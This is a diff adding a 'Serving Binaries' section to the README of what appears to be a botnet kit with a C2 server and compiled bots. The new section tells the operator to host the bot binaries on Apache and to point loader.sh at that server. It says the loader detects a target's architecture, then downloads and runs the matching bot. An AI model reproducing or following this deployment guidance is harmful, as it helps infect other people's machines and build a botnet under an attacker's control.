@@ -127,6 +127,24 @@ To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bo
 
 Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).
 
+### Serving Binaries
+
+After setup, compiled bots are in `bins/`. Host them with Apache so `loader.sh` can pull the right binary per-arch:
+
+```bash
+sudo apt install -y apache2
+sudo cp bins/* /var/www/html/bins/
+sudo systemctl start apache2
+```
+
+Edit `loader.sh` line 3 — replace the URL with your server:
+
+```bash
+SRV="http://<your-server-ip>/bins"
+```
+
+The loader auto-detects the target's architecture, downloads the matching binary, and runs it.
+
 > Full binary map: [`build.sh`](tools/build.sh)
 
 ---
